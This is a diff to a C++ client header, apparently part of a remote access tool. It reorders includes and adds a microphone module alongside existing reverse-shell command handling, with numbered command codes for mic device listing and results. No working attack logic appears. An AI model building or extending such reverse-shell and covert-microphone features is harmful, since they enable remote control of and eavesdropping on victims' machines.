@@ -1,9 +1,11 @@
-#include "headers.hpp"
-
 #ifndef _CLIENTE_H
 #define _CLIENTE_H
 
+#include "headers.hpp"
+#include "mod_mic.hpp"
+
 class ReverseShell;
+class Mod_Mic;
 
 
 class Cliente {
@@ -15,7 +17,7 @@ class Cliente {
 		void Init_Key();
 
 		ReverseShell* reverseSHELL = nullptr;
-
+		Mod_Mic* mod_Mic = nullptr;
 		
 	public:
 
@@ -25,7 +27,9 @@ class Cliente {
 			{"501", EnumComandos::Reverse_Shell_Start},
 			{"502", EnumComandos::Reverse_Shell_Command},
 			{"503", EnumComandos::Reverse_Shell_Salida},
-			{"504", EnumComandos::Reverse_Shell_Finish}
+			{"504", EnumComandos::Reverse_Shell_Finish},
+			{"505", EnumComandos::Mic_Refre_Dispositivos},
+			{"506", EnumComandos::Mic_Refre_Resultado}
 		};
 
 		Cliente();
